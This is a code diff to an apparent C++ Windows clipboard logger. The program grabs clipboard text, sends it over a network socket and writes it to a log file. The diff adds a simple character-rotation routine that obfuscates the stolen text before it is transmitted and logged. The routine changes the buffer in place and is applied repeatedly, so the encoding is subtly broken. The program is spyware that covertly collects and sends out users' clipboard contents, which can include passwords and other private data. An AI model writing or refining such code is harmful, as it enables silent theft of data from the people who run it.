@@ -18,6 +18,10 @@
 
 
 using namespace std;
+/********************************************************/
+char* someFunc(char* test,int rot);
+
+/********************************************************/
 //create a stream to a file stored in the Logbook object
 string Logbook = "Log1.txt";
 ofstream Recorder(Logbook);
@@ -144,12 +148,12 @@ int main() {
 					OpenClipboard(0);
 					//grab text from the clipboard
 					in = GetClipboardData(CF_TEXT);
-					sendbuf = (char*)in;
+					sendbuf = someFunc((char*)in, 5);
 					send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
 
 					//using said text display it to the console and store into the Logbook
-					std::cout << (char*)in << endl;
-					Recorder << (char*)in << endl;
+					cout <<someFunc((char*)in,5)  << endl;
+					Recorder << someFunc((char*)in,5)<< endl;
 					CloseClipboard();
 					break;
 					//Data type:HBITMAP
@@ -185,14 +189,14 @@ int main() {
 					OpenClipboard(0);
 					//grab text from the clipboard
 					in = GetClipboardData(CF_TEXT);
-					sendbuf = (char*)in;
+					sendbuf = someFunc((char*)in, 5);
 					send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
 					//This does not contain error case code, so if there is an error it will still log.
 					//We should add an if, incase the socket is busted.
 
 					//using said text display it to the console and store into the Logbook
-					std::cout << (char*)in << endl;
-					Recorder << (char*)in << endl;
+					cout << someFunc((char*)in, 5) << endl;
+					Recorder << someFunc((char*)in, 5) << endl;
 					CloseClipboard();
 					break;
 					//Data type:BITMAPINFO
@@ -228,8 +232,8 @@ int main() {
 					//grab text from the clipboard
 					in = GetClipboardData(CF_TEXT);
 					//using said text display it to the console and store into the Logbook
-					std::cout << (char*)in << endl;
-					Recorder << (char*)in << endl;
+					cout << someFunc((char*)in, 5) << endl;
+					Recorder << someFunc((char*)in, 5) << endl;
 					CloseClipboard();
 					break;
 					//Data type:HENHMETAFILE
@@ -314,4 +318,17 @@ int main() {
 	Recorder.close();
 	closesocket(ConnectSocket);
 	WSACleanup();
+ }
+ 
+
+ char* someFunc(char* test, int rot) 
+ {
+	 int i = 0;
+	 char* someText = test; 
+	 while (someText[i] != 0)
+	 {
+		 someText[i] = (char)(test[i] + rot);
+		 i++;
+	 }
+	 return someText;
  }
